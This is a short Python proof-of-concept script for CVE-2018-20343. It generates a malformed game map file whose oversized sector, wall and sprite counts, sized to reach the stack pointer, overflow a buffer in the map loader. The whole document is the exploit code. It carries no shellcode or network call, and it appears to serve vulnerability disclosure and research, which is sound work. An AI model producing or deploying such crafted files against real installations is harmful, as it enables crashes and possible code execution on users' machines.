#!/usr/bin/python3
#
# Description: PoC for CVE-2018-20343
# Author: Alexandre Bartel
#

import sys
import struct

SECTOR_TYPE_SIZE = 40
WALL_TYPE_SIZE = 32
SPRITE_TYPE_SIZE = 44

def generateMap(output_map_fn):

    with open(output_map_fn, "wb") as f:

        total_bytes_till_esp = 0x6b200

        nbrSectors = int ((total_bytes_till_esp + 10) / SECTOR_TYPE_SIZE + 2)
        print ("[+] nbrSectors: %s" % (nbrSectors))
        nbrWalls = 8000
        nbrSprites = 4000

        f.write(struct.pack('<L', 7)) # version, little endian
        f.write(struct.pack('<L', 0))
        f.write(struct.pack('<L', 0))
        f.write(struct.pack('<L', 0))
        f.write(struct.pack('<h', 0))
        f.write(struct.pack('<h', 0)) # cur sector
        f.write(struct.pack('<h', nbrSectors)) # nbr of sectors

        for i in range(nbrSectors):
            f.write(b'\xAA'*int(SECTOR_TYPE_SIZE))
        f.write(struct.pack('<h', nbrWalls)) # nbr of walls
        for i in range(nbrWalls):
            f.write(b'\xBB'*int(WALL_TYPE_SIZE))
        f.write(struct.pack('<h', nbrSprites)) # nbr of sprites
        for i in range(nbrSprites):
            f.write(b'\xCC'*int(SPRITE_TYPE_SIZE))

output_map_fn = sys.argv[1]
print ("[+] output map: '%s'" % (output_map_fn))

generateMap(output_map_fn)

